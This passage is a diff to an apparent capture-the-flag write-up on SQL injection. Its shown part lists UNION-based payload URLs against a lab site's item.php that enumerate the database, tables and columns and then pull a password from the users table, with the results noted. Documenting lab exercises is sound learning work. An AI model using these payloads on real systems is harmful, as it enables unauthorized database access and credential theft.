@@ -25,15 +25,19 @@ SQL injection (SQLi) is the exploitation of insecure input handling in applicati
 ```
 http://jurassic.park/item.php?id=6 union select 1,2,3,4,database();
 ```
+
 <img width="851" height="366" alt="jurassic_0_home_page" src="https://github.com/user-attachments/assets/1af9e58a-b44a-4b5c-a866-f38bcc100cdf" />
+
 ```
 http://jurassic.park/item.php?id=6%20union%20select%201,2,3,4,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20database();
 ```
 Retrieved tables: items, users
+
 ```
 http://jurassic.park/item.php?id=6%20union%20select%201,2,3,4,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%22users%22;
 ```
 Extracted columns: id, username, password...
+
 ```
 http://jurassic.park/item.php?id=6%20union%20select%201,2,3,4,version()%20;
 http://jurassic.park/item.php?id=3%20UNION%20SELECT%201,2,3,4,password%20from%20users%20where%20id=1;
